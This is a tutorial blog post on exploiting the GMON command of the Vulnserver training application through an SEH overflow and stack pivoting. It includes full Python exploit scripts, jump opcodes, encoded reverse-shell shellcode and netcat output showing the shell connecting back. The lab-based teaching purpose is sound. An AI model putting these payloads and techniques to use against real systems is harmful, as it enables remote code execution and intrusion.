---
title: "Vulnserver GMON - SEH Overflow & Stack Pivoting"
classes: wide
tag: 
  - "windows exploitation"
  - "vulnserver"
header:
  teaser: /assets/images/win-exp/windows-exp.png
ribbon: blue
description: "A simple walkthrough on  Vulnserver GMON SEH overflow with stack pivoting"
categories: ['Exploit-Development','Windows-Exploitation','Vulnserver']
---

- [Windows 10 Exploit Development - SEH Overflow & Stack Pivoting](#windows-10-exploit-development---seh-overflow--stack-pivoting)
  - [Prologue](#prologue)
  - [Stack Pivoting](#stack-pivoting)
  - [Finding the best way](#finding-the-best-way)
  - [Performing long jump](#performing-long-jump)
  - [Exploitation](#exploitation)

## Prologue

I had already discussed about ```SEH``` and how to overflow SEH to perform exploitation along with ```Egg hunters``` & ```Stack pivoting``` in my previous blog of this series

In this blog, we will be performing only ```Stack pivoting``` to exploit the GMON command

## Stack Pivoting

As we discussed in previous blog post, stack pivoting can be used to control the program execution to run our shellcode

The point is, we need to find a suitable way to pivot the stack so that our payload will get executed (It like pointing the way to the program for our shellcode)

Egg hunters do not work as expected everytime, so it is best to try an alternate approach to exploit with short buffers

We used ```egg hunter``` to find the egg inside our memory and made our shellcode to get executed, what if we directly stack pivot into the memory region containing shellcode with NOPS

By doing this, we don't need egg hunter and egg

## Finding the best way

After crashing with our python script, by overwriting SEH and nSEH values

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat overwrite-nseh.py 
import socket, sys
# to overwrite buffer and EBP
payload=b"A"*3549
# to overwrite nSEH
payload+=b"\xeb\xce"
payload+=b"\x90\x90"
# to overwrite SEH
payload+=b"\xb4\x10\x50\x62"
# padding
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 overwrite-nseh.py 
```

Now we can see that in hexdump, after SEH values we could also store some junk values (from our padding) in the stack from our script

We can also use a small piece of shellcode in this region instead of egghunter to perform a long jump, back to our main shellcode (For that we have to change the short jump opcode to forward jump in nSEH)

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-hexdump.png" style="width:60%">
</div>

Instead of that, we will use the same opcode in nSEH to perform backward short jump and lets do ```long jump``` from there to buffer data, instead of egg hunting

## Performing long jump

We could see that, our nSEH provides short jump

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-eax.png" style="width:60%">
</div>

After taking one step after the short jump, lets check the registers to verify that we are in our stack data or not

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-firststep.png">
</div>

It seems like, we are not in the right track to access the memory of the shellcode if placed

Lets use ```mona``` to find the offsets of all registers at this point to get some idea

Creating a pattern,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msf-pattern_create -l 3549
<GENERATED PATTERN>
```

Creating a fuzzing script to locate offsets by overwriting nSEH and SEH,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat offset-stack.py 
import socket, sys
# to overwrite buffer and EBP
payload=b"<GENERATED PATTERN>"
# to overwrite nSEH
payload+=b"\xeb\xce"
payload+=b"\x90\x90"
# to overwrite SEH
payload+=b"\xb4\x10\x50\x62"
# padding
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 offset-stack.py
```

After the first step of short jump, you will find lots of instructions like this used to create the pattern

Lets check our offsets now,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-mona.png">
</div>

Using ```!mona findmsp``` to locate offsets,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-findmsp.png">
</div>

Looks like we have two pointers pointing us towards ths buffer data in stack, which is matached by the pattern

Analysing the hexdump of the pointer address, ```esp + 0xdc``` to confirm the buffer data

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-stackdata.png">
</div>

If we use this pointer, we will be in our buffer data past ```1548 bytes```

Now we should perform a long jump of 1548 bytes from this point (one step past short jump)

Creating opcodes to perform long jump via ```nasm shell```,

```c
nasm > add esp, 0xdc
00000000  81C4DC000000      add esp,0xdc
```

Injecting ```null byte``` inside a shellcode will break the exploit, since it is a ```bad character```

Breaking it into smaller operations,

```c
>>> 0x6e+0x6e
220
>>> hex(0x6e+0x6e)
'0xdc'
```

Since ```0xdc == 0x6e + 0x6e```, we can make our opcodes like this

```
nasm > add esp, 0x6e
00000000  83C46E            add esp,byte +0x6e
nasm > add esp, 0x6e
00000000  83C46E            add esp,byte +0x6e
nasm > jmp [esp]
00000000  FF2424            jmp [esp]
nasm > 
```

Lets test it in our debugger by replacing it with our ```egg hunter``` of our previous exploit,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat longjump.py 
import socket, sys

# opcodes for long jump to reach ESP+0xdc
long_jmp=b""
long_jmp+=b"\x83\xc4\x6e"
long_jmp+=b"\x83\xc4\x6e"
long_jmp+=b"\xff\x24\x24"

nseh=b""
nseh=b"\xeb\xb6"
nseh+=b"\x90\x90"

seh=b"\xb4\x10\x50\x62"

# to overwrite buffer and EBP
payload=b""
# NOP sled
payload+=b"\x90"*(3549-70)
# long jump
payload+=long_jmp
payload+=b"A"*(3549-len(payload))
# to overwrite nSEH
payload+=nseh
# to overwrite SEH
payload+=seh
# padding
payload+=b"D"*(5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 longjump.py
```

After the short jump, we will be perfectly landing here executing our ```long jump``` opcodes,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-opcode.png">
</div>

After jumping to the memory of ```ESP``` we will be in the region of ```NOP Sled``` passed from our script

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-2-nopjump.png">
</div>

## Exploitation

Our shellcode should be placed after ```1548 bytes``` in the exploit

Make sure you test it in debugger and add some extra padding NOPS if needed

Lets craft our final exploit,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat exploit-1.py 
import socket, sys

# opcodes foe long jump to reach ESP+0xdc
long_jmp=b""
long_jmp+=b"\x83\xc4\x6e"
long_jmp+=b"\x83\xc4\x6e"
long_jmp+=b"\xff\x24\x24"

# shellcode
buf= b""
buf+=b"\xb8\xbb\xf1\x65\xd4\xdd\xc1\xd9\x74\x24\xf4\x5e\x31"
buf+=b"\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x55\x0d\x87"
buf+=b"\x21\x55\x06\xca\xca\xa5\xd7\xab\x43\x40\xe6\xeb\x30"
buf+=b"\x01\x59\xdc\x33\x47\x56\x97\x16\x73\xed\xd5\xbe\x74"
buf+=b"\x46\x53\x99\xbb\x57\xc8\xd9\xda\xdb\x13\x0e\x3c\xe5"
buf+=b"\xdb\x43\x3d\x22\x01\xa9\x6f\xfb\x4d\x1c\x9f\x88\x18"
buf+=b"\x9d\x14\xc2\x8d\xa5\xc9\x93\xac\x84\x5c\xaf\xf6\x06"
buf+=b"\x5f\x7c\x83\x0e\x47\x61\xae\xd9\xfc\x51\x44\xd8\xd4"
buf+=b"\xab\xa5\x77\x19\x04\x54\x89\x5e\xa3\x87\xfc\x96\xd7"
buf+=b"\x3a\x07\x6d\xa5\xe0\x82\x75\x0d\x62\x34\x51\xaf\xa7"
buf+=b"\xa3\x12\xa3\x0c\xa7\x7c\xa0\x93\x64\xf7\xdc\x18\x8b"
buf+=b"\xd7\x54\x5a\xa8\xf3\x3d\x38\xd1\xa2\x9b\xef\xee\xb4"
buf+=b"\x43\x4f\x4b\xbf\x6e\x84\xe6\xe2\xe6\x69\xcb\x1c\xf7"
buf+=b"\xe5\x5c\x6f\xc5\xaa\xf6\xe7\x65\x22\xd1\xf0\x8a\x19"
buf+=b"\xa5\x6e\x75\xa2\xd6\xa7\xb2\xf6\x86\xdf\x13\x77\x4d"
buf+=b"\x1f\x9b\xa2\xc2\x4f\x33\x1d\xa3\x3f\xf3\xcd\x4b\x55"
buf+=b"\xfc\x32\x6b\x56\xd6\x5a\x06\xad\xb1\xa4\x7f\xd9\xc1"
buf+=b"\x4d\x82\x21\xe4\x19\x0b\xc7\x82\x31\x5a\x50\x3b\xab"
buf+=b"\xc7\x2a\xda\x34\xd2\x57\xdc\xbf\xd1\xa8\x93\x37\x9f"
buf+=b"\xba\x44\xb8\xea\xe0\xc3\xc7\xc0\x8c\x88\x5a\x8f\x4c"
buf+=b"\xc6\x46\x18\x1b\x8f\xb9\x51\xc9\x3d\xe3\xcb\xef\xbf"
buf+=b"\x75\x33\xab\x1b\x46\xba\x32\xe9\xf2\x98\x24\x37\xfa"
buf+=b"\xa4\x10\xe7\xad\x72\xce\x41\x04\x35\xb8\x1b\xfb\x9f"
buf+=b"\x2c\xdd\x37\x20\x2a\xe2\x1d\xd6\xd2\x53\xc8\xaf\xed"
buf+=b"\x5c\x9c\x27\x96\x80\x3c\xc7\x4d\x01\x4c\x82\xcf\x20"
buf+=b"\xc5\x4b\x9a\x70\x88\x6b\x71\xb6\xb5\xef\x73\x47\x42"
buf+=b"\xef\xf6\x42\x0e\xb7\xeb\x3e\x1f\x52\x0b\xec\x20\x77"

nseh=b""
nseh=b"\xeb\xb6"
nseh+=b"\x90\x90"

seh=b"\xb4\x10\x50\x62"

# to overwrite buffer and EBP
payload=b""
payload+=b"\x90"*2600
payload+=buf
payload+=b"\x90"*(3549-70-len(payload))
payload+=long_jmp
payload+=b"\x90"*(3549-len(payload))
# to overwrite nSEH
payload+=nseh
# to overwrite SEH
payload+=seh
# padding
payload+=b"D"*(5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 exploit-1.py
```

By running this exploit crafted with stack pivoting, our reverse shell gets popped

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ nc -nlvp 9876
listening on [any] 9876 ...
connect to [192.168.116.128] from (UNKNOWN) [192.168.116.140] 54360
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

C:\vulnserver-master\vulnserver-master>whoami
whoami
vulnserver\winexp

C:\vulnserver-master\vulnserver-master>
```

This is how, we can replace usage of egghunters with stack pivots
